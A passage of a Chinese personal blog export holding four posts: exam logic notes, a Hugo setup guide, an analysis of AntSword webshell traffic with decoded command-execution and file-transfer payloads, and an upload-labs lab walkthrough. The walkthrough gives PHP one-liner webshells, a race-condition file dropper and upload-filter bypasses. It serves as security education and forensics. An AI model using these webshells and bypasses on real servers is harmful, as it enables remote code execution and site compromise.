[{"content":"言语理解和表达 判断推理 一、逻辑论证之归因论证 概述 归因介绍：指人们对他人或自己行为的原因的一轮过程。具体的说，就是观察者对他人的行为过程或自己的行为过程所进行的因果解释和推论。（一般由对比实验以及原因分析所组成）\n题型分类：归因论证分为实验对比论证、时间对比论证、直接根本原因三类\n质疑方式：另有他因（注意回归实验）、因果倒置（注意时间先后）、否定此因\n实验对比归因 另有他因 特征：回归实验，找到实验组和对照组的另一可能影响结果的不同点。\n常见错误选项：为谈论原因，未分组的典型伪他因、“有些”类选项、实验瑕疵类选项。\n当题目中有多种实验分组方式时，根据最终的结论来确定实验组与对照组\n因果倒置 因果倒置是一种在相对确定的条件下把原因和结果相互颠倒，视结果为原因和视原因为结果而引起的谬误\n【例】所有的迈阿密电力公司的高级官员都拥有大的游艇，因此如果你想成为迈阿密电力公司的高级官员的话，你最好有一艘大一点的游艇。\n因果倒置的质疑效果大于另有他因的质疑效果\n否定此因 否定此因并不探讨题干中某结果的原因是什么，只是否定题干汇总认定的原因。\n可以理解为如果a导致b，质疑的话就是c导致了a和b\n排除他因支持 排除他因支持是指排除其他可能影响结果的原因可能性，让题干中认定的原因成为唯一的可能原因。\n解释说明支持 时间对比归因 时间对比归因指的是当前与以往相比出现某种变化，并找到此种变化的可能原因。此时，可通过找到当前与过去的另一点不同，来进行他因削弱。\n一直存在且无变化的事实不会是某种变化的原因，“变化”才是“变化”的原因。\n直接根本归因 【例】原观点：A是C的原因。 反对者：B是C的原因。 如果要质疑反对者（支持原观点）\n原观点A导致反对者B导致C结果\n直接根本原因是一种固定题型，一般由原观点、反对者观点组成，多数设问为质疑反对者。正确答案一般为根本原因导致了直接原因。\n构成对比实验（题干中找不到对比） **条件：**缺少对照组；只有纵向对比（和自己比），补充横向对比（和别人比）\n**效果：**质疑：同因异果、异因同果；支持：异因异果\n构成对比试验是指选项与题干分别为实验组和对照组，通过“异因异果”进行支持或通过“异因同果/同因异果”进行质疑。\n补充对比实验 补充对比实验是指选项本身即是一个对比实验，通过对比实验结果进行支持或削弱。\n归因论证有悖常识结论的质疑 【例】通过统计习俗不抽烟的民族，他们的寿命要比经常抽烟喝酒的民族短命。因此学者推测，抽烟喝酒不一定影响人的寿命。\n质疑：（找实验的错误）那些因习俗而杜绝吸烟喝酒的民族饮食单一且热量较高。\n二、逻辑论证之一般质疑 一般质疑：有一些论据得出可能发生的结论、做出一定的判断\n没有论据，只有结论 无论据有结论：题干一般由“背景、分析和结论”，常用反向论据的方式进行反驳。\n有理由的质疑结论（抓准结论）\n有论据，有结论 质疑论据 论据存在错误时，可以指出论据问题质疑，论据有误，自然推不出结论。论据是个人观点、个人判断时，可能存在论据有误的错误。\n增加反向论据 题干可能通过一些有利因素得出积极结论或通过一些不利因素得出消极结论，犯了考虑不全面的错误；有些时候，因少量样本得出普遍结论，这就犯了以偏概全的错误。所以可以找出不利因素增加反向的论据来质疑结论。\n断点搭桥 若题干的论据和结论并不相关，根据论据推不出结论，犯了“推不出”的错误，可通过拆桥来进行质疑。\n质疑结论（结论中有无中生有的内容） 若题干结论中出现了程度较重的“无中生有”内容，可重点关注，进行质疑。\n虽然 论据是这样 但是“选项” 所以不能得出这样的结论\n三、逻辑论证之支持、前提、解释 五种支持方式：解释说明、断点搭桥、增加论据、必要条件\n断点搭桥 若题干中的结论中存在论据没有的“新内容”，此新内容一定在选项中要有所体现，并能够和论据中的关键信息进行搭桥。\n四、逻辑论证之数量论证 比例类论证（可秒） 此类问题常犯的逻辑错误使用\u0026quot;分子的多少\u0026quot;代替“分子/分母的比例”得出结论，题干往往包含数字\n申论 小总结 归因类问题，如果选项中指出有其他原因导致该结果的产生，要分清楚是伪他因还是他因。他因的话需要回归实验。举个例子a、b、c导致了d的结果，但现在我们通过实验认为是a导致了d的发生，如果选项中只是提到b、c也能导致d的结果，这种方式无法质疑原来的结论，因为它并没有否定a导致d这一结论。但是如果是说该实验其实证明的是b、c导致的就可以质疑。\n【例】我考上了是因为我努力 归因\n这要努力，你一定能上岸 一般\n我感冒时因为着凉 归因\n病毒感染，会导致感冒 一般\n一般质疑和归因实验区别在于，归因是对已发生的结果找到一个原因去联系，一般质疑是根据已知的论据去推测出可能发生的结果。\n","date":"2025-06-29T08:39:28+08:00","image":"https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/202409160012295.png","permalink":"https://blog.winglet.com/p/%E8%80%83%E5%85%AC%E7%AC%94%E8%AE%B0/","title":"考公笔记"},{"content":"前言 ​\t以前的电脑出问题了，现在换了一个新电脑，所以以前装的软件和配置都要重新配置，我的博客也需要重新配置参数。所以顺便写这样一篇部署博客的文章。\n环境配置 下载hugo 官方地址：Hugo官网 Github地址:gohugoio/hugo 配置环境变量 下载完后会有一个hugo.exe 文件，将它随便放置一个文件夹内，然后将该文件夹的路径输入到环境变量配置中。像这里我就是把hugo.exe放在hugo目录内，之后将该目录路径输入进环境变量配置中，接着重启电脑。 打开cmd命令框，出现下面的情况则说明hugo部署成功。 下载git 官方地址：Git - 安装 Git 博客部署 创建blog 创建一个用于部署博客的文件夹，然后在该目录下打开命令提示符（CMD），输入 hugo new site xxxx，其中 xxxx 是你自定义的名称，我这里使用的是 hugo-blog。执行后将会生成你的博客目录。接着输入 hugo server 命令，Hugo 将会在本地启动服务器，通过访问 localhost:1313 即可查看博客的运行效果。不过由于当前博客目录中尚未添加主题模板，因此页面会显示“Page not found”。 拉取hugo主题模板 首先在在创建的blog目录中，右键选择git bash。然后输入git init，进行git仓库初始化。 这里我选择的主题模板是hugo-theme-stack，可以输入以下命令获取或是去github网站下载压缩包。 git submodule add https://github.com/CaiJimmy/hugo-theme-stack.git themes/hugo-theme-stack 接着将themes/hugo-theme-stack文件夹下的exampleSite/content和exampleSite/hugo.yaml复制到主文件夹中，并删除根目录的hugo.toml\n之后修改themes文件夹下的主题文件夹的名称，保证和hugo.yaml中的主题名一样\n接着输入命令hugo server，再访问localhost:1313就可以看到有主题的博客。 GitHub部署 注册一个github账号。 新建仓库，命名使用{用户名}.github.io。 接下来参考这篇文章用 Hugo 重新搭建博客 - 炸鸡人博客 这里用 Github Pages 来部署博客。首先在 config.yaml 里指定 publishDir: docs 然后再一个 hugo 命令，这样就把静态页面输出到 docs 目录下了。 接着在 Github 上以 ZhaJiMan.github.io 的名字（根据自己的用户名而定）新建一个空仓库，进行下面的 Git 命令 git add . git commit -m \u0026#34;first commit\u0026#34; git branch -M main git remote add origin https://github.com/ZhaJiMan/ZhaJiMan.github.io.git git push -u origin main 这段改编自空仓库页面出现的提示，大意是： 将网站目录下的所有内容暂存。 把暂存的内容提交给版本库。 把主分支的名字从 master 改为 main。 添加远程仓库。 把本地内容推送到远程仓库里。 推送成功后，进入仓库的设置页面，点击侧栏的 Pages，再把 Source 选项改为 main 分支下的 docs 目录，这样 Github Pages 就会根据我们推送上去的 docs 目录里的静态页面来显示网站。这里指定 docs 的好处是还可以把网站的所有文件都备份到仓库里（不包含以 submodule 形式添加主题，详见参考链接）。最后在与仓库同名的网站 https://zhajiman.github.io/ 上看看自己的博客吧！ 搭建图床 cloudfare和piclist cloudflare创建存储库 左边栏选择R2-概述，然后点击创建存储桶 接下来自定义存储桶的名称，这样就创建好了自己的存储桶 进入存储桶的设置界面 允许访问子域名，然后就会生成一个可以公共访问的url 可以在这两个中选择一个\n之后会有密钥等重要信息，需要保存下来\npiclist配置 自定义节点就是编辑api令牌中的地址 自定义域名就是之前存储库生成的url 可能遇到的问题 一、 在输入hugo server进行本地部署时可能出下图中的问题 出现这种问题是因为hugo-theme-stack中有一篇文章使用了twitter api的短代码，而你的电脑无法访问twitter网站就会出现这种报错信息，解决的办法也简单，删除这段短代码就行。 这些都可以删了，基本用不上。 ","date":"2025-06-26T18:00:40+08:00","image":"https://pub-491d983cd40449fea50cff8b66683e0d.r2.dev/img/20250710214000244.png","permalink":"https://blog.winglet.com/p/%E5%88%9B%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","title":"创建个人博客"},{"content":"前言 做应急响应题遇到了蚁剑流量分析的题，就正好研究一下\n蚁剑流量特征 基本特征 在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件\n内容如下\n#1.php \u0026lt;?php eval($_POST[\u0026#39;cmd\u0026#39;]); ?\u0026gt; 然后打开wireshark，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了\n这个就是蚁剑连接该ip的流量包了，我们右键红框那条，然后查看TCP流\n这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征\n1. 请求包中有`ini_set`函数 2. 连接命令在第一个=前 3. 使用的是php语言 执行命令 现在在蚁剑中打开虚拟终端，输入whoami命令\n接着去看流量包\n可以发现里面内容有了一些变化，将其url解码后，得到\ncmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.bf363c62\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;319\u0026#34;.\u0026#34;4a4\u0026#34;;echo @asenc($output);echo \u0026#34;5df\u0026#34;.\u0026#34;af0b\u0026#34;;}ob_start();try{$p=base64_decode(substr($_POST[\u0026#34;v1c2cd0fd6bb3\u0026#34;],2));$s=base64_decode(substr($_POST[\u0026#34;t29c2b8006f9cb\u0026#34;],2));$envstr=@base64_decode(substr($_POST[\u0026#34;j3bef2f7ea0db5\u0026#34;],2));$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$c=substr($d,0,1)==\u0026#34;/\u0026#34;?\u0026#34;-c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;:\u0026#34;/c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;;if(substr($d,0,1)==\u0026#34;/\u0026#34;){@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;);}else{@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\u0026#34;);}if(!empty($envstr)){$envarr=explode(\u0026#34;|||asline|||\u0026#34;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(\u0026#34;|||askey|||\u0026#34;, \u0026#34;=\u0026#34;, $v));}}}$r=\u0026#34;{$p} {$c}\u0026#34;;function fe($f){$d=explode(\u0026#34;,\u0026#34;,@ini_get(\u0026#34;disable_functions\u0026#34;));if(empty($d)){$d=array();}else{$d=array_map(\u0026#39;trim\u0026#39;,array_map(\u0026#39;strtolower\u0026#39;,$d));}return(function_exists($f)\u0026amp;\u0026amp;is_callable($f)\u0026amp;\u0026amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == \u0026#34;/\u0026#34; \u0026amp;\u0026amp; fe(\u0026#39;putenv\u0026#39;) \u0026amp;\u0026amp; (fe(\u0026#39;error_log\u0026#39;) || fe(\u0026#39;mail\u0026#39;))) {if (strstr(readlink(\u0026#34;/bin/sh\u0026#34;), \u0026#34;bash\u0026#34;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), \u0026#39;as\u0026#39;);putenv(\u0026#34;PHP_LOL=() { x; }; $c \u0026gt;$tmp 2\u0026gt;\u0026amp;1\u0026#34;);if (fe(\u0026#39;error_log\u0026#39;)) {error_log(\u0026#34;a\u0026#34;, 1);} else {mail(\u0026#34;a@127.0.0.1\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;-bv\u0026#34;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != \u0026#34;\u0026#34;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if(fe(\u0026#39;system\u0026#39;)){@system($c,$ret);}elseif(fe(\u0026#39;passthru\u0026#39;)){@passthru($c,$ret);}elseif(fe(\u0026#39;shell_exec\u0026#39;)){print(@shell_exec($c));}elseif(fe(\u0026#39;exec\u0026#39;)){@exec($c,$o,$ret);print(join(\u0026#34; \u0026#34;,$o));}elseif(fe(\u0026#39;popen\u0026#39;)){$fp=@popen($c,\u0026#39;r\u0026#39;);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(\u0026#39;proc_open\u0026#39;)){$p = @proc_open($c, array(1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(\u0026#39;antsystem\u0026#39;)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=\u0026#34;/\u0026#34; \u0026amp;\u0026amp; @class_exists(\u0026#34;COM\u0026#34;)){$w=new COM(\u0026#39;WScript.shell\u0026#39;);$e=$w-\u0026gt;exec($c);$so=$e-\u0026gt;StdOut();$ret.=$so-\u0026gt;ReadAll();$se=$e-\u0026gt;StdErr();$ret.=$se-\u0026gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;);print ($ret!=0)?\u0026#34;ret={$ret}\u0026#34;:\u0026#34;\u0026#34;;;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;j3bef2f7ea0db5=5j\u0026amp;t29c2b8006f9cb=dGY2QgIi93d3cvYWRtaW4vbG9jYWxob3N0XzgwL3d3d3Jvb3QiO3dob2FtaTtlY2hvIDE2Njc2Zjtwd2Q7ZWNobyA2MGRkNTY5MmYwYWI=\u0026amp;v1c2cd0fd6bb3=ToL2Jpbi9zaA== 可以感觉到后面这两段字符串很像base64编码，但是解码后是乱码，研究代码逻辑后会发现这些字符串是从第三个字符开始才是base64编码，前面两个字符是来混淆的。将其解码后得到\n上传文件 我们创建一个flag.txt文件,内容为\nwinglet 然后上传并抓包，得到\nbd01290c7a42fc=WGL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA==\u0026amp;cmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.fdc0c2f\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;7c10b\u0026#34;.\u0026#34;57b77\u0026#34;;echo @asenc($output);echo \u0026#34;1f6c\u0026#34;.\u0026#34;800e3\u0026#34;;}ob_start();try{$f=base64_decode(substr($_POST[\u0026#34;bd01290c7a42fc\u0026#34;],2));$c=$_POST[\u0026#34;j26d10e499b152\u0026#34;];$c=str_replace(\u0026#34;\\r\u0026#34;,\u0026#34;\u0026#34;,$c);$c=str_replace(\u0026#34;\\n\u0026#34;,\u0026#34;\u0026#34;,$c);$buf=\u0026#34;\u0026#34;;for($i=0;$i\u0026lt;strlen($c);$i+=2)$buf.=urldecode(\u0026#34;%\u0026#34;.substr($c,$i,2));echo(@fwrite(fopen($f,\u0026#34;a\u0026#34;),$buf)?\u0026#34;1\u0026#34;:\u0026#34;0\u0026#34;);;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;j26d10e499b152=77696E676C65740D0A 这里文件里内容的关键就在\nj26d10e499b152=77696E676C65740D0A 不过这个不是什么编码，研究代码逻辑后，会发现解密关键在于将每两个字符前面加上%，然后进行url解码。可以编写脚本\nfrom urllib.parse import unquote,quote a = \u0026#34;77696E676C65740D0A\u0026#34; for i in range(0,len(a),2): if __name__ == \u0026#39;__main__\u0026#39;: tmp = unquote(f\u0026#34;%{a[i]}{a[i+1]}\u0026#34;) print(tmp, end=\u0026#34;\u0026#34;) # winglet 下载文件 通过蚁剑下载该站点的一个文件后，抓取流量，内容如下\ncmd=@ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);$opdir=@ini_get(\u0026#34;open_basedir\u0026#34;);if($opdir) {$ocwd=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$oparr=preg_split(base64_decode(\u0026#34;Lzt8Oi8=\u0026#34;),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item.\u0026#34;/.b6be21d1b36\u0026#34;;@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set(\u0026#34;open_basedir\u0026#34;, \u0026#34;..\u0026#34;);$cntarr=@preg_split(\u0026#34;/\\\\\\\\|\\//\u0026#34;,$tmdir);for($i=0;$i\u0026lt;sizeof($cntarr);$i++){@chdir(\u0026#34;..\u0026#34;);};@ini_set(\u0026#34;open_basedir\u0026#34;,\u0026#34;/\u0026#34;);@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;a58b4c\u0026#34;.\u0026#34;6a1088\u0026#34;;echo @asenc($output);echo \u0026#34;0f00\u0026#34;.\u0026#34;6f47c\u0026#34;;}ob_start();try{$F=base64_decode(substr(get_magic_quotes_gpc()?stripslashes($_POST[\u0026#34;nf74681be6e0e5\u0026#34;]):$_POST[\u0026#34;nf74681be6e0e5\u0026#34;],2));$fp=@fopen($F,\u0026#34;r\u0026#34;);if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo(\u0026#34;ERROR:// Can Not Read\u0026#34;);};}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();\u0026amp;nf74681be6e0e5=gQL3d3dy9hZG1pbi9sb2NhbGhvc3RfODAvd3d3cm9vdC9mbGFnLnR4dA== 将下面的编码解码后可得\n/www/admin/localhost_80/wwwroot/flag.txt 为该文件在站点的绝对路径。\n","date":"2024-05-07T22:24:33+08:00","image":"https://gcore.jsdelivr.net/gh/wingllllet/pic_bed@img/img/202405082248171.png","permalink":"https://blog.winglet.com/p/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","title":"蚁剑流量分析"},{"content":"前言 重新打一下upload-labs靶场，这次会尽可能从代码原理方面去理解漏洞的产生与影响。\n搭建 这里我使用的是一位大佬自己搭建的upload靶场，不过知识点还是一样的。GitHub - sqlsec/upload-labs-docker: 国光的文件上传靶场，基于 upload-labs 定制\n下载他的压缩包后，解压用docker搭建即可。\n如果用的最新版docker的话，起镜像的名令为\ndocker compose up -d upload_1 [JS] 漏洞分析 这关漏洞在于它只进行前端验证。右键查看源代码\n可以看到这段js代码的作用就是对上传的文件进行判断和过滤。\n就是我们只有在上传.jpg .png .gif .jpeg后缀文件时，才能上传成功。\n但是它只进行了前端验证，所以只要上传一个符合条件的文件，在前端验证完把文件放走后用bp抓包，在它即将把数据发送给后端时，将文件名修改为.php文件，就能成功上传该木马。\n解决方法 我们先创建一个一句话木马文件，内容如下\n\u0026lt;?php @eval($_POST[1]); ?\u0026gt; 将其后缀改为.jpg，上传并用burpsuite抓包，抓到的数据如下\n然后将文件后缀改为.php，并放包\n这个就是我们上传的文件了，然后我们右键它复制链接\n找到上传的地址了，接下来用蚁剑连接\n出现这个绿标就宣告我们成功了\nupload-2 [.htaccess] 漏洞分析 这个靶场带有源码，所以就用源码来讲解，如果是实际情况，那肯定是不能看到的，只能自己去一个一个尝试。\n这个黑名单就是这段代码的关键点，可以看到它过滤了很多可执行文件，并且因为这个并不是上一关的js前端审核，我们无法通过抓包改后缀的方法去绕过。\n那么这关的思路就是它在页面上的提示了.htaccess文件。\n.htaccess是一个用于配置Apache HTTP服务器的文件。它通常位于网站的根目录或特定目录下，通过在文件中编写一些规则和指令，可以对该目录或其子目录的行为进行自定义设置。它允许您在不修改服务器配置文件的情况下，对特定目录或网站的行为进行修改。可以在.htaccess文件中添加各种指令，例如重定向规则、访问控制、错误页面定义、缓存控制等。 这个黑名单是没有过滤这个后缀的，所以就可以上传.htaccess文件，它里面的内容就写成\n\u0026lt;FilesMatch \u0026#34;.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 这段代码是一个Apache HTTP服务器的配置，用于将对以\u0026#34;.jpg\u0026#34;结尾的URL请求的处理器设置为PHP解析器。当Apache服务器收到以\u0026#34;.jpg\u0026#34;结尾的请求时，它会将请求交给PHP解析器来处理，而不是将其作为静态图片文件返回。 在这段配置中，\u0026lt;FilesMatch\u0026gt;标签用于匹配特定的文件名模式，这里是匹配以\u0026#34;.jpg\u0026#34;结尾的文件。SetHandler指令用于设置与匹配的文件相关联的处理器，这里是将处理器设置为application/x-httpd-php，即PHP解析器。 起到的作用就是，我们上传的.jpg文件，会被自动当作.php文件进行执行。\n解决方法 首先创建一个.htaccess文件，在里面写入上面说的内容，然后上传\n可以看到我们上传成功了，接着把一句话木马的后缀改为.jpg，直接上传\n接下来就用蚁剑连接\n连接成功，而且可以看到我们连接的文件后缀还是.jpg\nupload-3 [MIME] 漏洞分析 我们先介绍一下MIME\nMIME（Multipurpose Internet Mail Extensions）是一种标准，用于标识互联网上不同类型的文件和媒体内容。MIME类型由两部分组成：主类型（top-level type）和子类型（sub-type），用斜杠分隔。例如，`text/html`和`image/jpeg`都是MIME类型。 MIME类型用于指示文件或数据的性质和格式，以便客户端和服务器可以正确地处理和解释内容。它在HTTP协议中的`Content-Type`头部字段中使用。 这关没有源码可看，但对上传文件还是进行了限制。需要测试什么文件类型可以上传，然后我们再上传木马文件，并将其的MIME类型修改为可以上传的类型。\n解决方法 我们先上传.jpg文件，并抓包看看数据\n发现这个文件类型可以成功上传，接着我们可以把文件后缀改为.php文件，继续上传发现依然能上传成功。但是如果我们一开始就上传.php文件，就会发现无法上传，因为上传.php文件后content-type的值就会变成\nContent-Type: application/x-php 这个文件类型是不能上传成功的类型，接着直接蚁剑连接\n成功\nupload-4 [文件头] 漏洞分析 这关有源码，所有就可以看源码进行分析。\n这就是关键的部分，可以看到有两个白名单，第一个就是上一关讲到的MIME类型，这个绕过的方法就不再讲述了。\n第二个就是检测你的文件头，看你的文件头是否和.gif .jpg .png文件的文件头一致，而我们只需要在代码前面加上相应的文件头字符串即可。常用的就是GIF89a\n解决方法 先上传一句话木马文件，然后抓包\n这两处就是我们需要修改的部分，改为\n然后发包，即可上传成功，接着就可以蚁剑连接。\nupload-5 [代码缺陷1] 漏洞分析 有缺陷的代码，已经在界面上展示了，所以就直接分析这三句代码即可。可以看到它还是设了一个黑名单，不过它与前几关的不同点是它并没有禁止这些文件上传，而是修改这些文件的名称。比如上传了一个1.php的文件，它依然可以上传成功，但是我们会搜不到这个文件。因为该文件名称中有php这段字符串，所以就会把它替换为空字符，文件名就变成了1。\n所以我们的绕过方法就是用字符拼接进行绕过。比如上传1.pphphp\n它会检测到php这段字符串，但是就算把它替换为空字符了,我们的文件依然是php文件\n1.pphphp --\u0026gt; 1.php 解决方法 把木马文件的后缀改为.pphphp，然后上传\n然后就会发现上传的文件依然是.php文件\n接着用蚁剑连接即可\nupload-6 [代码缺陷2] 漏洞分析 这个问题代码其实和上关差不多，但是它是把黑民单的字符改为了空格符，这就导致字符复写的方法用不了了，但是它提示我们用的系统是Windows系统，在Windows系统中是区分大小写的，所以就可以通过大小写进行绕过。linux系统是不区分大小写的，所以大小写绕过的方法是无法成功的。\n解决方法 将后缀改为.PHp，然后上传\n文件后缀没有改变。\nupload-7 [GET型%00截断] 漏洞分析 这是上传部分的代码。\n这个方法页面也给出了，接下来就讲解一下%00截断的原理。%00其实就是十六进制的\\x00它们对应的ascii码值是0,但是它所表示的并不只是一个数字0，这是网上搜到的解释\n也就是说它还表示NULL和空字符，在低版本PHP中空字符表示着一行代码的结束。\nupload/1.php%001.png\t--\u0026gt;\t1.php 如果get传参是这样的数据，最后会被认为是1.php文件，而后面的1.png就会被省略。%00截断的原理大概就是这样了。但为什么使用%00可以绕过这个文件上传呢。这就要分析代码。\n这是我们上传并抓包得到的数据。我们上传一个jpg文件，来通过白名单。之后存储文件的时候\n$des = $_GET[\u0026#39;road\u0026#39;] . \u0026#34;/\u0026#34; . $filename; 这里的road=../upload/1.php%004535524.jpg，%00后面的被省略了，就导致我们上传的是1.php文件，而1.jpg文件中的内容也会被写入1.php文件内，通过这中方法就上传了一个木马文件。\nupload-9 [黑名单缺陷] 漏洞分析 这关的问题主页已经提到了，就是在设置黑名单的时候，忽略了其他文件，导致那些文件正好也可以被执行。比如在apache服务器中，除了.php文件会被作为php文件执行，还有\nphtml php5 php3 php4 pht phps php3p 所以就可以把木马文件的后缀改为它们中的一个，依然可以上传成功。\n解决方法 将文件后缀改为phtml，然后上传。上传成功后用蚁剑连接\n连接成功\nupload-10 [条件竞争] 漏洞分析 ​\t直接看代码，可以看到文件先会被成功上传，然后才会根据白名单，进行修改文件名或者删除文件，所以如果我们能在程序在改变文件之前访问文件，就能成功执行该木马文件。但因为它只能存在一会儿，所以木马的内容需要修改\n\u0026lt;?php fputs(fopen(\u0026#39;xiao.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#39;);?\u0026gt; 这段代码意思就是在当前目录下创建一个名为xiao.php的一句话木马，只要我们执行了文件，就能成功写入一句话木马。\n解决方法 上传文件，然后用bp抓包\n右键选择intruder，选择Null payloads\n然后我们访问它即将上传的网站路径，再次抓包，然后如上的操作，之后点击开始攻击\n右边爆破的长度出现变化，说明执行成功了，接下来就可以访问到xiao.php文件，用蚁剑成功连接\nupload-11 [二次渲染] 漏洞分析 这里的关键就在于imagecreatefromxxx这个函数，它会把我们上传的图片文件进行一次渲染，导致的结果就是图片中的二进制数据可能会发生改变，也就是我们上传的图片码会被渲染成一张普通图片，里面用于执行的代码可能会被修改删除。但是我们依然有绕过的办法，就如该页面所给出的提示。\ngif 准备一张gif图\n我们把它上传上去，然后将渲染后的图片保存到本地，接着将两张图片放入010editor进行比较\n灰色的部分就是没有发生变化的部分，所以我们可以把代码写入灰色部分。\n然后再次将它上传，将渲染后的gif图保存到本地\n可以看到payload没有被删除，个人感觉gif是最简单的。\njpg png 这两个都需要脚本进行修改，人比较懒后面再进行补充\n解决方法 上面的方法是我们如何将payload成功填入文件，并上传，但上传后该怎么使用呢。其实可以注意到这关的网址和之前是有一点区别的\nhttp://ip:30011/?file=hint.html 多了一个file参数，在没有看源码时可以猜测，这里可能存在文件包含漏洞，我们传入/etc/passwd\n确实存在文件包含漏洞，所以我们只要包含上传图片的路径，就能执行里面的payload了，然后用蚁剑连接\nupload-12 [move_uploaded_file缺陷] 漏洞分析 这里要用到move_uploaded_file函数的一个缺陷。当我们能能控制$img_path的值时，如果我们输入1.php/.，该函数会将其判断为1.php，但是由于我们在上传时文件名是1.php/.，所以可以绕过黑名单\n解决方法 然后访问\n可以看到文件成功上传\nupload-13 [代码审计] 漏洞分析 既然这里说到了要代码审计，那就直接查看代码，这就是关键代码\n\u0026lt;?php header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); //设置上传目录 define(\u0026#34;UPLOAD_PATH\u0026#34;, dirname(__FILE__) . \u0026#34;/upload/\u0026#34;); define(\u0026#34;UPLOAD_URL_PATH\u0026#34;, str_replace($_SERVER[\u0026#39;DOCUMENT_ROOT\u0026#39;], \u0026#34;\u0026#34;, UPLOAD_PATH)); if (!file_exists(UPLOAD_PATH)) { mkdir(UPLOAD_PATH, 0755); } $is_upload = false; if (!empty($_POST[\u0026#39;submit\u0026#39;])) { $allow_type = 